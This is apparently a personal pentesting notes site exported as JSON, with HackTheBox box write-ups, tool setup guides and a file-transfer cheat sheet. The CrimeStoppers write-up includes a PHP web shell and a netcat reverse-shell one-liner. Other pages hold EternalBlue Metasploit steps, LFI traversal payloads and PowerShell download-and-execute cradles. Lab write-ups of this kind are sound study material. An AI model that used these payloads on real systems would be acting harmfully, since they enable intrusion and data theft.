[
{
	"uri": "/hackthebox/boxes/",
	"title": "Boxes",
	"tags": [],
	"description": "",
	"content": "Boxes\n```   FTP FILE TRANSFER PROTOCOL SSH secure shell HTTP and an unknown port protected H2 database on 8082 GOBUSTER\n  Blue Blue Special thanks to IppSec for contributing to this post. Please Subscribe changes /etc/hosts so 10.10.10.40 blue.htb PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed.\n  CrimeStopper watch the ippsec video https://www.youtube.com/watch?v=bgKth1K44QA read this guide :https://0xdf.gitlab.io/2018/06/03/htb-crimestoppers.html This is just a summary of those two guides. Initial scan only shows port 80 open. + FSociety ransomware all the major credit databases and destroyed the backups. wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://crimestoppers.htb/?op=FUZZ Navigating to list we get a list of submitted tips. A note from white rose. https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/ So null, byte doesn\u0026rsquo;t work and encoding the string doesn\u0026rsquo;t work.\n  Legacy NMAP nmap -sC -sV -p 139,445 -oA nmap/scripts 10.10.10.4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-22 19:37 EST Nmap scan report for 10.10.10.4 Host is up (0.042s latency). PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: mean: -4h05m13s, deviation: 1h24m51s, median: -5h05m13s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:50:56:a4:5d:23 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2019-02-22T23:32:00+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed.\n  Mischief THIS IS A SUMMARY OF IPPSEC VIDEO \u0026amp; 0XDF GUIDE. watch the ippsec video https://www.youtube.com/watch?v=GKo6xoB1g4Q read this guide https://0xdf.gitlab.io/2019/01/05/htb-mischief.html Summary, this box highlights securing ipv6. I would like to note the ipv6 address changes every reset so careful copy pasting. The quality of the phpsession tokens is exellent damnit. Nmap -v print output as it find it -max-retries 0 \u0026lt;\u0026ndash; save for later # Nmap 7.70 scan initiated Tue Jan 1 16:00:09 2019 as: nmap -sV -sC -p- -Pn -oA total -T5 10.\n  Optimum NMAP nmap -sV -sC 10.10.10.8 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-25 00:19 EST Nmap scan report for 10.10.10.8 Host is up (0.042s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.\n  Poison PHASE 1 NMAP nmap -sC -sV -Pn -oA initial_poison 10.10.10.84 port 22 ssh it can be a rabbit-hole. port 80 webpage apache 2.4.29 (FreeBSD) PHP/ 5.6.32 port 514 hmm PHASE 2 LFI Manually inspect the webpage this is kind of tedious. As you’ll have to investigate the PHP scripts one by one. listfiles.php has an interesting new piece of information. Go back to the default webpage and enter PWDBACKUP.TXT.\n  SecNotes NMAP PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 | http-title: Secure Notes - Login |Requested resource was login.php 445/tcp open microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB) 8808/tcp open http Microsoft IIS httpd 10.0 |-methods: | Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h32m44s, deviation: 4h37m10s, median: -7m17s\n  Valentine I lost my original notes. VM corrupted. PHASE 1 — NMAP nmap -sC -sV -Pn -oA initial 10.10.10.79 Didn’t return anything of significance. https is odd for a hackthebox challenge. Port 22 could be the initial foothold. Google apache 2.2.22 https vulns nothing crazy pops out. PHASE 2 — GOBUSTER /wpscan gobuster -u [http://10.10.10.](http://10.10.10.88)79 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-mediuml.txt -t 50 return vulnerable to OpenSSL hearbleed PHASE 3 Manual investigation of the webpage\n  Waldo WALDO Instead of giving binaries system-wide permissions, give them the permissions they need to do the job. Skipping past Nmap, after messing around with the request’s found three request fileWrite, dirRead, fileRead. FileWrite writes user-supplied input to list1. dirRead will enumerate directories and print out the content. fileRead needs the exact file path to work. Sqlmap, Wfuzz didn’t work I had more success with wfuzz but I couldn’t filter the output.\n  Zipper NMAP initial # Nmap 7.70 scan initiated Fri Feb 15 14:32:38 2019 as: nmap -sC -sV -oA nmap/intial -T4 10.10.10.108 Nmap scan report for 10.10.10.108 Host is up (0.046s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA) | 256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA) |_ 256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519) 80/tcp open http Apache httpd 2.\n  oz {{ button href=\u0026ldquo;https://www.youtube.com/watch?v=yX00n1UmalE\u0026quot; theme=danger }} IppSec {{ /button }} NMAP two ports 80 \u0026amp; 8080 nmap -sC -sV -oA nmap/oz-initial 10.10.10.96 -T4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-20 11:18 EST Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.00% done Nmap scan report for 10.10.10.96 Host is up (0.041s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Werkzeug httpd 0.\n  sunday INCOMPLETE sunos 5.111 2008, SunSsh FINGER USER LIST finger user@10.10.10.76 -s displays the user login real terminal write status no access is a least priviliege user -l same as -s but with directory information -p limits -l output stuff this box requires equine wordlist you can’t use the standard one. Metasploit module, be sure to change the dictionary used to enumerate the user list. Sammy Sunny HASHCAT I don’t remember where I found the hashes, i digress.\n  ```\n"
},
{
	"uri": "/hackthebox/boxes/hawk/",
	"title": "",
	"tags": [],
	"description": "",
	"content": "FTP FILE TRANSFER PROTOCOL\nSSH secure shell\nHTTP\nand an unknown port protected\nH2 database on 8082\nGOBUSTER\n"
},
{
	"uri": "/hackthebox/challenges/bloodhound/",
	"title": "",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/",
	"title": "",
	"tags": [],
	"description": "",
	"content": "PLEASE CONTACT ME ON TWITTER OR BY EMAIL AT CHICKENPWNY IF ANY OF THE CONTENT VIOLATES HACKTHEBOX EULA.\nWelcome, to my repository of knowledge, HACKTHEBOXon walkthroughs, pentesting tools \u0026amp; concepts. The top right you will find social links. to the left or top, you should see navigation depends on the platform.\n"
},
{
	"uri": "/concepts/webapppentest/lfi/",
	"title": " Local File inclusion",
	"tags": [],
	"description": "",
	"content": "Local file inclusion this vulnerability occurs when system commands or unsanitized user input or written into how the web server handles user input. Basically, you escape out of the current string and your commands get executed. This only grants you the access the web app has. So if the PHP script has permissions for www-data which is a web server user. You won\u0026rsquo;t be able to access anything with elevated permissions. Before you start thinking PHP is the bad guy I want to go ahead and say all of the webpage languages are vulnerable.\nWord list for lfi can be found in seclist: /Seclist/Fuzzing/LFI-JHADDIX.txt\n\u0026hellip;.//\u0026hellip;.//\u0026hellip;.//etc/passwd\n/../../etc/passwd\n/..../..../..../..../..../..../etc/passwd\n/\u0026hellip;/\u0026hellip;/\u0026hellip;/\u0026hellip;/\u0026hellip;/etc/passwd\n\\…..\\\\…..\\\\…..\\\\etc\\passwd\n Often there will be filters in place, and then the job becomes understanding how the information is being filtered. If you\u0026rsquo;d like to see how PHP script in waldo handled user input read the WALDO write-up. You can also use burp to test for LFI I would recommend it makes it really convenient to test. in POISON there weren\u0026rsquo;t any filters in place so the standard escaped worked. (examples later) The web form allowed you to read local files. RCE :\nSadly LFI can\u0026rsquo;t upload files so if you want to get a reverse shell you will need the ability to upload binaries. FTP, Upload forums, you can execute the file by going to uploaded binary to execute it to get access.\n "
},
{
	"uri": "/tools/bloodhound/",
	"title": "BloodHound Neo4j",
	"tags": [],
	"description": "setting up bloodhound in a Debian environment",
	"content": "TAKE A SNAPSHOT BEFORE ATTEMPTING THIS.\nI would highly recommend installing Neo4j using the repository. Neo4j is a database for bloodhound API. I had a couple of issues installing this. had some issues with multiple versions of Java running. currently, neo4k only runs on Java 8 kali currently comes with 11.x. need to tell java to use the legacy version. Next, need to add the repository to download neo4j.\n##### echo \u0026quot;deb http://httpredir.debian.org/debian jessie-backports main\u0026quot; | sudo tee -a /etc/apt/sources.list.d/jessie-backports.list apt-get update ##### apt-get -t jessie-backports install ca-certificates-java ##### take the output and put it after set \u0026lt;java8bane\u0026gt; update-java-alternatives --list ##### currently update-java-alternatives --jre --set \u0026lt;java8name\u0026gt; ##### update repo wget -O - https://debian.neo4j.org/neotechnology.gpg.key | sudo apt-key add - echo 'deb https://debian.neo4j.org/repo stable/' | sudo tee -a /etc/apt/sources.list.d/neo4j.list sudo apt-get update ###### neo4j start -- background neo4j console -- foreground  BloodHound\ngo to the desirded location you wish to set this up. For me a have a tool directory. ##### this is already compiled ready to go git clone https://github.com/BloodHoundAD/BloodHound.git cd BloodHound wget https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-linux-x64.zip unzip BloodHound-linux-x64.zip ./Bloodhound if you get a white screen hit these keys ( crtl + r ) #### For a lager selection of compiled bloodhound releases. https://github.com/BloodHoundAD/BloodHound/releases  I changed the password before I got to this part. So I will be using screenshots from ippsecs video. when you first setup bloodhound and enter some creds it\u0026rsquo;ll ask you to go to localhost:7687 to change the password. go to your browser and type it in. the default creds for neo4j are neo4j and it won\u0026rsquo;t let you in until you change the password which is nice a feature.\nbloodhound login\ninitial neo4j browser page\nchange your password\nIf you\u0026rsquo;d like to install from the repo use this guide\nhttps://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/ references and thanks https://www.youtube.com/watch?v=ob9SgtFm6_g\u0026amp;t=21s https://neo4j.com/docs/operations-manual/current/installation/linux/debian/ https://0xdf.gitlab.io/2018/11/10/htb-reel.html  "
},
{
	"uri": "/hackthebox/boxes/blue/",
	"title": "Blue",
	"tags": [],
	"description": "",
	"content": " Blue Special thanks to IppSec for contributing to this post. Please Subscribe\nchanges /etc/hosts so 10.10.10.40 blue.htb\nPORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 82.62 seconds  Windows 7 Professional 7601 Service Pack 1\nport 135 = RPC a couple buffer overflow attacks I doubt its vulnerable.\nport 139 = NetBIOS is rarely vulnerable you can enumerate the system with it through gathering information\nport 445 = Smb server message block often exploitable. Don\u0026rsquo;t count on it though.\nTalking about EnternalBlue Atleast l wilI try to, for a detailed in-depth explanation Click Here\nThe exploit MS17-10, aka EternalBlue was used by an Nation State Advisory and after getting leaked and becoming public a different group used it to cryptolocker a good portion of internet connected SMB Hosts. SMB normally isn\u0026rsquo;t connected to the internet, so it is doubtful the exploit is intended to be the initial infection. It is was an excellent tool to move around a network laterally as SMB is used legitimately by Windows for domain management. Today, it remains a way to gain SYSTEM access to unpatched system and attempt to find loot that is helpful.\nEternalBlue exploits three bugs to achieve RCE\n Wrong Casting Bug \u0026ndash; this leads to a buffer overflow Wrong Parsing Function Bug \u0026ndash; Using two functions, to trick the system they can\u0026rsquo;t handle large packs so it will split packets into smaller packers. Since the first function breaks it will escape out SMB treats the last function as the first. This allows bug A to work by Treating Dword as word. Non-paged Pool Allocation Bug \u0026ndash; creates a hole in the heap stack allowing 1 \u0026amp; 2 to write in memory.  Exploiting Blue Using nmap to check and make sure the vulnerability exist.\nNmap -p445 \u0026ndash;script vuln blue.htb -T4\n Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-24 06:22 EST Nmap scan report for blue.htb (10.10.10.40) Host is up (0.13s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds  Now, go into Metasploit. While running the exploit. It will fail a couple times so wait patiently for it to return a shell.\nmsfconsole search lue exploit/windows/smb/ms17_010_eternalblue MS17-010 EternalBlue SMB Remote Windows use exploit/windows/smb/ms17_010_eternalblue set RHOST 10.10.10.40 run  The user flag is in c:\\Users\\haris\\Desktop\ntype user.txt The root flag is in c:\\Users\\Adimistrator\\Desktop\ntype root.txt "
},
{
	"uri": "/tools/webapp/burp/",
	"title": "Burp",
	"tags": [],
	"description": "",
	"content": "Burp Suit is a graphical tool for web app security. It can do a host of things but in the free version its limited. In hack the box you will mostly use it to proxy web request and edit them before you send it off to the server. theres repeater which is basically like saving the web request allows you to repeat the web request.\ntheres also intruder I use it to check and make sure the cookies are random.\noptions as the request method will return the used methods for the webapp. "
},
{
	"uri": "/categories/",
	"title": "Categories",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/_header/",
	"title": "ChickenPwny",
	"tags": [],
	"description": "",
	"content": " ChickenPwny "
},
{
	"uri": "/concepts/",
	"title": "Concept",
	"tags": [],
	"description": "",
	"content": "Concept\n WebAppPenTests \n  "
},
{
	"uri": "/hackthebox/boxes/crimestoppers/",
	"title": "CrimeStopper",
	"tags": [],
	"description": "",
	"content": " watch the ippsec video https://www.youtube.com/watch?v=bgKth1K44QA\nread this guide :https://0xdf.gitlab.io/2018/06/03/htb-crimestoppers.html\nThis is just a summary of those two guides.\nInitial scan only shows port 80 open. +\nFSociety ransomware all the major credit databases and destroyed the backups.\nwfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://crimestoppers.htb/?op=FUZZ\nNavigating to list we get a list of submitted tips. A note from white rose.\nhttps://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/\nSo null, byte doesn\u0026rsquo;t work and encoding the string doesn\u0026rsquo;t work.\nYou can retrieve the information using burp, browser or command line. Copy paste into vim and use base64 to decode the file. 0xdf used curl to get the page information removing the useless parts.\nbase64\nCopy the output in burp into a vim :set paste; then use base64 -d list.b64 \u0026gt; list.php\nCURL \u0026mdash;\ncurl -sD - 10.10.10.80/?op=php://filter/convert.base64-encode/resource=index | head -44 | tail -1 | cut -d' ' -f1 | base64 -d \u0026gt; index.php -s silent mode -D dump-header  head\nexamining index.php\nThe Filter\n$op = empty($_GET['op']) ? 'home' : $_GET['op'];  if(!is_string($op) || preg_match('/\\.\\./', $op) || preg_match('/\\0/', $op)) die('Are you really trying ' . htmlentities($op) . '!? Did we Time Travel? This isn\\'t the 90\\'s');  The first part is the GET parameter; we are exploiting GET to get local file inclusion.\n$op = empty($_GET['op']) ? 'home' : $_GET['op'];  (is_string) checks if the VAR is a string or not.\nif(!is_string($op)  (preg_match) Matches a regular expression to a given pattern. Looking for Directory traversal ../ \u0026amp; the NULL byte 0. We\u0026rsquo;re not allowed to escape the local directory.\npreg_match('/\\.\\./', $op) preg_match('/\\0/', $op)  Admin cookie value is 0 (isset) determines if it is a NULL character; it will return true or false. I believe this means if you want to be admin set your cookie to zero.\n//Cookie if(!isset($_COOKIE['admin'])) { setcookie('admin', '0'); $_COOKIE['admin'] = '0'; }  This says if admin cookie is loosely compared to 1. I don\u0026rsquo;t think loose and strict comparison will lead anywhere with this. When the cookie value is changed to 1 a new tab will appear next to upload.\n \u0026lt;?php if ($_COOKIE['admin'] == 1) { echo '\u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;?op=list\u0026quot;\u0026gt;List\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;';  If $op ends with .php it will produce no such page.\nif(!(include $op . '.php')) fatal('no such page');  List.php\nThis goes to the folder named after your ip address and access submitted tips.\n \u0026lt;?php // Only show files uploaded by the client. This is to prevent people from accessing eachothers uploads. foreach (scandir(\u0026quot;uploads/\u0026quot; . $_SERVER['REMOTE_ADDR']) as $file) { if (!preg_match('(\\.)', $file)) { echo \u0026quot;\u0026lt;li\u0026gt;\u0026lt;a href=\\\u0026quot;?op=view\u0026amp;secretname=\u0026quot; . $file . \u0026quot;\\\u0026quot;\u0026gt;\u0026quot; . $file . \u0026quot;\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\u0026quot;; } } ?\u0026gt;  curl http://10.10.10.80/uploads/10.10.14.2/\nThis next part is pretty tricky. so we know PHP filter is looking for .. and 0. The script also filters out .php extension so even if we upload a PHP reverse shell, the system won\u0026rsquo;t know what to do with the script. The name of the Directory storing the PHP script is your IP Address. you can\u0026rsquo;t just upload the PHP script because it gets corrupted during copping, adding extra invisible characters. The secretname is randomly generated an md5 sum. We can access it by going to view and we can access it by going to view\u0026amp;secretname.\nMaking the script chickenpwny should be replaced for posterity.\n\u0026lt;? php echo system($_REQUEST['CHANGEME']); ?\u0026gt;  zip cmd.zip cmd.php  base64 -w 0 cmd.zip -w 0 makes it a one liner width 0  UPLOADING THE PHP SCRIPT\n go to the uploads page\n enter some info into the fields\n Turn on Burp Intercept\n click Send Tip\n Send to Repeater\n Then Drop the packet\n Go to Repeater in the tip field copy paste the base64 encode zip file.\n Decode the encoded zip file\n  The highlighted green area is the files name\n/?op=zip://uploads/10.10.14.2/6d069117de936936b6c43c9ca832df8217e704d5%23cmd\u0026amp;chickenpwny=whoami OverView /?op=zip://uploads/YOUR HTB IP ADDRESS/THE SECRET FILE NAME GREEN HIGHLIGHTED AREA ABOVE %23cmd\u0026amp;chickenpwny=whoami %23 is the url encoded representation of #  Pentestmonkey - shells\nFirst setup a NetCat listener nc -lvnp PORT rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc CHANGE_ME PORT\u0026gt;/tmp/f crtl + u to url encode the string, should like the string below %23cmd\u0026amp;chickenpwny=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2\u0026gt;%261|nc+CHANGE_ME+PORT+\u0026gt;/tmp/f  Upgrading the shell, :P tricky python isn\u0026rsquo;t available but python3 is haha ippsec\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;  HOME directory shinagans\ntar -cjvf /var/www/html/uploads/10.10.14.2/firefox.tar.bz2 36jinndk.default/\nmv 36jinndk.default/ ~/.thunderbird/\ncd ~/.thunderbird/\nvim profiles.ini\n36jinndk.default\nthunderbird -ProfileManager\nEMAILS If we created a bug bounty page, would you be open to using them as a middle man? Submit the bug, they will verify the existence and handle the payment.\nI don\u0026rsquo;t know how this ecoins things work.\nOn 12/16/2017 11:46 AM, WhiteRose wrote:\nHello,\nI left note on \u0026ldquo;Leave a tip\u0026rdquo; page but no response. Major vulnerability exists in your site! This gives code execution. Continue to investigate us, we will sell exploit! Perhaps buyer will not be so kind.\nFor more details place 1 million ecoins in your wallet. Payment instructions will be sent once we see you move money.\nDid you know anything about this? Anyways, I\u0026rsquo;m trying to get them to agree to an alternative form of payment where we can better track the recipient.\nHope the DarkArmy thinks we\u0026rsquo;re a bunch of dummies that don\u0026rsquo;t know anything about eCoin.\nElliot.\nWe got a suspicious email from the DarkArmy claiming there is a Remote Code Execution bug on our Webserver. I don\u0026rsquo;t trust them and ran rkhunter, it reported that there a rootkit installed called: apache_modrootme backdoor.\nAccording to my research, if this rootkit was on the server I should be able to run \u0026ldquo;nc localhost 80\u0026rdquo; and then type \u0026ldquo;get root\u0026rdquo; to get a root shell. However, the server just errors out without providing any shell at all. Would you mind checking if this is a false positive?\nROOT There is a rootkit installed but it cannot be accessed using nc localhost 80. I tried following ippsec using radare2 but I can never get it to work like in the videos. So I used idafree-7.0, there will be a second guide that will cover setting up ida. Moving on, Looking through the Function names should notice a function called Darkarmy. Once you view the darkarmy functions after malloc hover your cursor over unk_1BF2 it will show you what we need. You may also press enter ounces its highlighted to go to the operand, you may also right click and select jump to operand. I had troubles screenshotting it. You can also press space bar to go into a different view.\nNotes : 38h in asci is 8 \u0026amp; /r is x0d\nNow to convert the asci into something readable. I found two ways to do this thank 0xdf \u0026amp; ippsec, firstIwrote a python script but you may run it in terminal.\na = 'HackTheBox' b = '\\x0E\\x14\\x0d\\x38\\x3b\\x0b\\x0c\\x27\\x1b\\x01' print [chr(ord(x) ^ ord(y)) for x,y in zip(a,b)]  b1 = bytearray(\u0026quot;\\x0E\\x14\\x0d\\x38\\x3b\\x0b\\x0c\\x27\\x1b\\x01\u0026quot;) b2 = bytearray(\u0026quot;HackTheBox\u0026quot;) for i in range(0,9): print chr(b1[i] ^ b2[i])  instead of get root its get FunSociety,\nnc 10.10.10.80 80 get FunSociety id cat /root/root.txt  ALTERNATIVE METHODS find / -type f -newermt 2017-12-17 ! -newermt 2017-12-31 -ls 2\u0026gt;/dev/null\nzcat to view gunziped files, check error.logs\nzcat access.log.[par] .* :\nzcat access.log.[1234] .* |grep -v \u0026lsquo;OPTIONS\\|HEAD\\|POST\\|GET\u0026rsquo;\nWATCH THE VIDEO\nhttps://www.youtube.com/watch?v=bgKth1K44QA\nREAD THIS GUIDE\nhttps://0xdf.gitlab.io/2018/06/03/htb-crimestoppers.html\n"
},
{
	"uri": "/tools/ftp/",
	"title": "FTP",
	"tags": [],
	"description": "",
	"content": "File transfer protocol is a terrible service and you should never run it without some kind of protection in front of it. I\u0026rsquo;ve bumped into quite a few boxes running FTP. I often forget all the commands you can run with ftp.\nmget * download everything in the directory get download file / documents put upload file / documents nmap (maybe even in intereactive mode)  SSHFS \u0026amp; SFTP\nSSHFS is built on SFTP. SFTP use’s the SSH protocol for added security to FTP. SSHFS allows you to mount to the file system. This gives you more options when interacting with the host. If SSH is available on the host you can use SFTP or SSHFS.\napt-get install sshfs -y sshfs -p 2222 user@ip_address: /mnt/nightmare/ find . -ls 2\u0026gt;/dev/null \u0026gt; ~/out/put/directory.txt \u0026lt;-- takes forever grep file.txt ~/out/put/directory.txt  "
},
{
	"uri": "/filetransfer/",
	"title": "File Transfer",
	"tags": [],
	"description": "",
	"content": "############################################Linux 1# Python http server listener = python3 -m http.server 9090 upload = curl -F 'data=@home/Documents' IP_ADDRESS download = curl http://IP_ADDRESS -o file Note for wget post method youll need to use netcat instead of python doesn't support post. upload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename 2# Netcat notice with this method , sender \u0026lt;, reciever \u0026gt;. -w wait, -l listener -p port upload = nc -w 3 [your_ip] 1337 \u0026lt; file.txt listener = nc -lp 1337 \u0026gt; file.txt if you'd like to compress and decompress sending a whole image with the dd comand, lol. wow https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/ ############################################Windows — Download ​``` # Python http server ​``` listener = python3 -m http.server 9090 IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/file-needed') ############################################ Upload using SMB to share files i would like to note that that impacket might hang and since its written in python. ps -ef|grep python. #target machine net use z: \\\\IP_ADDRESS\\share ​``` # kali machine ​``` impacket-smbserver share `pwd` | ` not ' #target machine copy file_name z: ###################### note if you have issues try this method ###################################### #target machine net use z: \\\\IP_ADDRESS\\share ​``` # kali machine impacket-smbserver share `pwd` | ` not ' #target machine cd z: mkdir tmp cd tmp IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/file-needed') ############################################ Reel Method from hackthebox kind of difficult to setup. Hopefully, I saved you all the pain it caused me. download = IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/FILE') Using nginx to transfer files. watched a video by ippsec, you should subscribe. Anyways seems like a neat trick to keep handy. Also, back up nginx before you mess with it. Back it up, anything for the love of God. mkdir /var/www/upload cd /etc/nginx/sites-available cat default|grep -v '\\#'|grep . \u0026gt; file_upload vi file_upload server { listen [CHANGE ME PORT] default_server; server_name chicken.pwny; location / { root /var/www/upload; dav_methods PUT; } } cd /etc/ ln -s /etc/nginx/sites-available/file_upload /etc/nginx/sites-enabled/ chmod 644 /var/www/html chown www-data /var/www/upload/ service nginx start #### this method assigns the applockerpolcy to a variable and the invoke-restmethod will call the variable. $output = Get-ApplockerPolicy -Effective -xml Invoke-RestMethod -Method PUT -Uri \u0026quot;http://IP_ADDRESS:PORT/file.txt\u0026quot; -Body $output ####  "
},
{
	"uri": "/hackthebox/github/",
	"title": "GitHub",
	"tags": [],
	"description": "",
	"content": "  Hugo/Github/Power How to setup a Hugo Static WebPage using PowerShell on GitHub!\n  "
},
{
	"uri": "/tools/webapp/gobuster/",
	"title": "GoBuster",
	"tags": [],
	"description": "",
	"content": " Go Buster  Gobuster is a tool often used to enumerate web directories. It offers more power than dirb \u0026amp; dirbuster. You dont have to use the extension switch all the time and it may not be necessary. I would recommend limiting extensions to whats relevant.\nEnumerating Directories gobuster -u http://TARGET_IP:PORT -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 -t for threads can go as high as 200, 100 is kind of to much 40 is perfect for multiple things going on. -s \u0026quot;200,204,301,302,307,404\u0026quot; errors to look for you can edit these -w medium or small -x extensions *Linux* php html txt doc *Windows* aspx asp php -fw force wild card -l filter out matching lengths Adding SessionID this can be easily overlooked. -c PHPSESSIONID=1324567890  Enumerating Browser User Agent Burp Proxy User Agent (certain browser Sufarri, FireFox, Chrome, IE). Some webservers can be configred to only accept a certain browser.\ngobuster -u http://target:port -a \u0026lsquo;agent\u0026rsquo; -w wordlists -t 100\nAdding multple extentions\n-x php,aspx,asp,html,doc,txt\n"
},
{
	"uri": "/hackthebox/",
	"title": "HackTheBox",
	"tags": [],
	"description": "",
	"content": "HackTheBox\n Boxes Boxes ``` FTP FILE TRANSFER PROTOCOL SSH secure shell HTTP and an unknown port protected H2 database on 8082 GOBUSTER Blue Blue Special thanks to IppSec for contributing to this post. Please Subscribe changes /etc/hosts so 10.10.10.40 blue.htb PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed.\n  GitHub  Hugo/Github/Power How to setup a Hugo Static WebPage using PowerShell on GitHub!   Miscellaneous Setting up Test Enviroment or Complicated tools.   "
},
{
	"uri": "/concepts/webapppentest/heartbld/",
	"title": "HeartBleed",
	"tags": [],
	"description": "",
	"content": "Heart bleed is an OpenSSL vulnerability that allows the attacker to �bleed� out whatever in memory on the server. You can also dump the TSL/SSL cert for the webpage. You can modify the exploit to continuously extract data at 64 bytes at a time. Messing around with the POC was tricky the c code has all these errors and won�t compile arg, luckily for me, Metasploit has the solution.\nProff of concept https://www.exploit-db.com/exploits/32745/\nMetasploit: https://www.rapid7.com/db/modules/auxiliary/scanner/ssl/openssl_heartbleed\n"
},
{
	"uri": "/hackthebox/github/hugopowershell/",
	"title": "Hugo/Github/Power",
	"tags": [],
	"description": "How to setup a Hugo Static WebPage using PowerShell on GitHub!",
